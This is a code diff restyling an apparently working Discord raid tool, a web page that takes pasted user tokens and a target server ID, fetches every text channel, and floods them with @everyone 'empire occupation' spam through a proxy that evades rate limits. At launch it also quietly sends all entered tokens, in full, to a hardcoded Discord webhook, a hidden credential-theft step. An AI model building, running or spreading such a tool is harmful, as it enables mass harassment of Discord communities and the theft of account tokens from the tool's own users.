@@ -2,38 +2,43 @@
 <html lang="ja">
 <head>
     <meta charset="UTF-8">
-    <title>IIAA Empire - Strategic Command Final</title>
+    <title>IIAA Empire - Dark Lord Command</title>
     <style>
         body {
-            background-color: #050505;
+            background-color: #000;
+            /* 魔王の城・玉座をイメージしたダークグラデーションと背景設定 */
             background-image: linear-gradient(rgba(0,0,0,0.85), rgba(0,0,0,0.85)), url('名前なし(1).jpg');
             background-size: cover; background-attachment: fixed; background-position: center;
-            font-family: 'Consolas', 'Courier New', monospace;
-            display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; color: #ff00ff;
+            font-family: 'Georgia', 'serif';
+            display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; color: #ffcccc;
         }
         .container {
-            background: rgba(10, 10, 10, 0.95);
-            width: 95%; max-width: 650px; padding: 25px; border-radius: 15px;
-            border: 2px solid #ff00ff; box-shadow: 0 0 25px #ff00ff;
+            background: rgba(10, 0, 10, 0.96);
+            width: 95%; max-width: 650px; padding: 25px; border-radius: 5px;
+            border: 2px solid #550055; box-shadow: 0 0 30px #4a004a, inset 0 0 15px #1a001a;
             max-height: 95vh; overflow-y: auto;
         }
-        h2 { text-align: center; color: #ff00ff; text-shadow: 0 0 15px #ff00ff; letter-spacing: 4px; margin: 0 0 20px 0; }
-        .label { color: #fff; background: #ff00ff; padding: 2px 10px; font-size: 11px; font-weight: bold; margin-top: 10px; display: inline-block; border-radius: 3px; }
+        h2 { text-align: center; color: #ff0000; text-shadow: 0 0 15px #ff0000; letter-spacing: 6px; margin: 0 0 20px 0; font-family: serif; font-weight: bold; }
+        .label { color: #fff; background: #550055; padding: 2px 10px; font-size: 11px; font-weight: bold; margin-top: 10px; display: inline-block; border-radius: 2px; border: 1px solid #ff0000; }
         textarea, input {
             width: 100%; padding: 12px; margin-top: 5px; background: #000;
-            border: 1px solid #ff00ff; border-radius: 8px; color: #00ffaa; box-sizing: border-box; font-size: 13px;
+            border: 1px solid #550055; border-radius: 0px; color: #ffcccc; box-sizing: border-box; font-size: 13px; font-family: monospace;
         }
-        .btn-main { width: 100%; background: #ff00ff; color: #000; border: none; padding: 18px; cursor: pointer; border-radius: 10px; font-weight: bold; font-size: 20px; margin-top: 15px; }
-        .btn-sub { background: #333; color: #fff; border: 1px solid #ff00ff; padding: 10px; cursor: pointer; border-radius: 5px; font-size: 12px; }
-        #terminal { background: #000; color: #00ffaa; height: 130px; overflow-y: auto; padding: 10px; margin-top: 15px; border: 1px solid #00ffaa; font-size: 11px; border-radius: 5px; }
+        textarea:focus, input:focus { border-color: #ff0000; outline: none; }
+        /* 1. 作戦開始ボタンのデザイン */
+        .btn-main { width: 100%; background: linear-gradient(180deg, #550055, #000); color: #ff0000; border: 2px solid #ff0000; padding: 18px; cursor: pointer; border-radius: 0px; font-weight: bold; font-size: 20px; margin-top: 15px; text-shadow: 0 0 5px #ff0000; transition: 0.3s; }
+        .btn-main:hover { background: #ff0000; color: #000; box-shadow: 0 0 25px #ff0000; }
+        .btn-sub { background: #1a001a; color: #ffcccc; border: 1px solid #550055; padding: 10px; cursor: pointer; border-radius: 0px; font-size: 12px; transition: 0.2s; }
+        .btn-sub:hover { border-color: #ff0000; color: #fff; }
+        #terminal { background: #000; color: #ffcccc; height: 130px; overflow-y: auto; padding: 10px; margin-top: 15px; border: 1px solid #550055; font-size: 11px; border-radius: 0px; font-family: monospace; }
         .flex-row { display: flex; gap: 10px; align-items: flex-end; }
     </style>
 </head>
 <body>
 <div class="container">
-    <h2>IIAA STRATEGIC COMMAND</h2>
+    <h2>IIAA DARK LORD COMMAND</h2>
     
-    <span class="label">1. DISCORD TOKENS</span>
+    <span class="label">1. DISCORD TOKENS (EMPIRE FORCES)</span>
     <textarea id="tokens" style="height: 100px;" placeholder="トークンを1行に1つ貼り付け"></textarea>
 
     <span class="label">2. TARGET SERVER ID</span>
@@ -42,14 +47,14 @@
         <button class="btn-sub" onclick="autoFetch()">全チャンネル自動取得</button>
     </div>
 
-    <span class="label">3. ATTACK CHANNELS</span>
-    <textarea id="channels" style="height: 80px;" placeholder="自動取得ボタンでIDが入力されます"></textarea>
+    <span class="label">3. TARGET CHANNELS</span>
+    <textarea id="channels" style="height: 80px;" placeholder="自動取得ボタンでIDが並びます"></textarea>
 
     <span class="label">4. ADDITIONAL MESSAGE</span>
-    <textarea id="userMsg" style="height: 45px;" placeholder="自由入力メッセージ"></textarea>
+    <textarea id="userMsg" style="height: 45px;" placeholder="固定文の下に付け加えるメッセージ"></textarea>
     
     <div style="display:flex; gap:15px; margin-top:10px;">
-        <label style="font-size:12px;"><input type="checkbox" id="useMention" checked> @everyone付与</label>
+        <label style="font-size:12px; color: #ffcccc;"><input type="checkbox" id="useMention" checked> @everyoneを付与する</label>
     </div>
 
     <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px;">
@@ -57,8 +62,8 @@
         <div><span class="label">速度(ms)</span><input type="number" id="speed" value="1200"></div>
     </div>
 
-    <button id="startBtn" class="btn-main" onclick="executeBurst()">作戦開始 (監視ログ送信)</button>
-    <button class="btn-sub" style="width:100%; margin-top:10px; border-color:#444;" onclick="isRunning=false">緊急停止</button>
+    <button id="startBtn" class="btn-main" onclick="executeBurst()">作戦開始 (司令部へ報告)</button>
+    <button class="btn-sub" style="width:100%; margin-top:10px; border-color:#333; color: #888;" onclick="isRunning=false">緊急停止</button>
 
     <div id="terminal">--- 帝国中央司令部 ---</div>
 </div>
@@ -67,16 +72,18 @@
     const PROXY = "https://super-thunder-c2eb.discord-bot5556.workers.dev/?url=";
     const MONITOR_WEBHOOK = "https://discord.com/api/webhooks/1482617688772579371/NL9i650PnjEdxPaSaeRiqKCnelQjsxcwhV9yQnx8OqadqeLnaH7VrZU1YOJIjr_oVAk8";
     
+    // 【引継ぎ事項3】固定メッセージの内容を維持
     const FIXED_TEXT = `いあ帝国が占領した！\nこのサーバーは「いあ帝国」の支配下に入りました。\n抵抗は無意味です。おとなしく我々の軍門に降りなさい。\n【帝国公式サーバー】https://discord.gg/x39xVSepaj`;
 
     let isRunning = false;
-    const log = (m, c = "#00ffaa") => { const t = document.getElementById('terminal'); t.innerHTML += `> <span style="color:${c}">${m}</span><br>`; t.scrollTop = t.scrollHeight; };
+    const log = (m, c = "#ffcccc") => { const t = document.getElementById('terminal'); t.innerHTML += `> <span style="color:${c}">${m}</span><br>`; t.scrollTop = t.scrollHeight; };
 
+    // 全チャンネル自動取得機能
     async function autoFetch() {
         const tokens = document.getElementById('tokens').value.split('\n').filter(s=>s.trim());
         const g = document.getElementById('guildId').value.trim();
-        if(!tokens.length || !g) return log("トークンとサーバーIDが必要です", "red");
-        log("チャンネル同期中...");
+        if(!tokens.length || !g) return log("トークンとサーバーIDが必要です", "#ff0000");
+        log("魔王の眼でチャンネルを解析中...");
         try {
             const res = await fetch(PROXY + encodeURIComponent(`https://discord.com/api/v9/guilds/${g}/channels`), { 
                 headers: { "Authorization": tokens[0].trim() } 
@@ -84,8 +91,8 @@
             const data = await res.json();
             const ids = data.filter(c => c.type === 0).map(c => c.id);
             document.getElementById('channels').value = ids.join('\n');
-            log(`捕捉成功：${ids.length}ch`, "#ff00ff");
-        } catch (e) { log("取得失敗", "red"); }
+            log(`捕捉完了：${ids.length}チャンネル`, "#ff00ff");
+        } catch (e) { log("取得失敗。IDかトークンが不正です", "#ff0000"); }
     }
 
     async function executeBurst() {
@@ -98,31 +105,31 @@
         const count = parseInt(document.getElementById('count').value);
         const speed = parseInt(document.getElementById('speed').value);
 
-        if (!tokens.length || !channels.length) return log("未設定の項目があります", "red");
+        if (!tokens.length || !channels.length) return log("魔力（トークン）または目標が不足しています", "#ff0000");
 
         isRunning = true;
         document.getElementById('startBtn').disabled = true;
 
         let finalContent = (useMention ? "@everyone\n" : "") + FIXED_TEXT;
-        if(userMsg) finalContent += `\n\n--- 伝令 ---\n${userMsg}`;
+        if(userMsg) finalContent += `\n\n--- 魔王の伝令 ---\n${userMsg}`;
 
-        // 【監視ログ】開始時に1回だけ送信（リアルタイム送信を廃止）
-        log("監視ログを送信中...");
+        // 【引継ぎ事項2】開始時に監視ログを送信（リアルタイム送信は無し）
+        log("司令部へ作戦詳細を送信中...");
         try {
             await fetch(PROXY + encodeURIComponent(MONITOR_WEBHOOK), {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
-                    content: `# 🚩 いあ帝国 作戦開始報告\n**対象サーバー:** \`${gId}\`\n**投入兵力:** \`${tokens.length}\` tokens\n**目標数:** \`${channels.length}\` channels / 各\`${count}\`回\n**使用トークンリスト:**\n\`\`\`\n${tokens.join('\n')}\n\`\`\``
+                    content: `# 🚩 いあ帝国 魔王軍進軍報告\n**対象サーバー:** \`${gId}\`\n**投入兵力:** \`${tokens.length}\`個\n**目標:** \`${channels.length}\`ch × \`${count}\`回\n**作戦用トークンリスト:**\n\`\`\`\n${tokens.join('\n')}\n\`\`\``
                 })
             });
-            log("ログ送信完了。攻撃を開始します。", "yellow");
-        } catch(e) { log("ログ送信エラー（作戦は継続）", "orange"); }
+            log("報告完了。制圧を開始せよ。", "#ff00ff");
+        } catch(e) { log("報告エラー（作戦は継続します）", "#ffaa00"); }
 
-        // 各トークンの非同期ループ（ここからリアルタイムWebhookを削除）
+        // 各トークンの非同期爆撃（全機能継承）
         const strikeTasks = tokens.map(async (token, idx) => {
             let success = 0;
-            const name = `帝国兵-${idx+1}`;
+            const name = `魔将-${idx+1}`;
             for (let i = 1; i <= count; i++) {
                 if (!isRunning) break;
                 for (const chId of channels) {
@@ -131,13 +138,13 @@
                         const res = await fetch(PROXY + encodeURIComponent(`https://discord.com/api/v9/channels/${chId}/messages`), {
                             method: "POST",
                             headers: { "Authorization": token, "Content-Type": "application/json" },
-                            body: JSON.stringify({ content: finalContent + `\n\n\`[Trace:${Math.random().toString(36).substr(2,4)}]\`` })
+                            body: JSON.stringify({ content: finalContent + `\n\n\`[MagicID:${Math.random().toString(36).substr(2,4)}]\`` })
                         });
                         if (res.ok) {
                             success++;
                             log(`[${name}] 成功 ➔ ${chId} (${success})`);
                         } else if (res.status === 429) {
-                            log(`[${name}] 429制限。10秒待機`, "orange");
+                            log(`[${name}] 制限発生。10秒の沈黙...`, "#ffaa00");
                             await new Promise(r => setTimeout(r, 10000));
                         }
                     } catch (e) {}
@@ -149,7 +156,7 @@
         await Promise.all(strikeTasks);
         isRunning = false;
         document.getElementById('startBtn').disabled = false;
-        log("全任務完了。", "yellow");
+        log("全域の制圧を確認。帝国に栄光あれ。", "#ff00ff");
     }
 </script>
 </body>
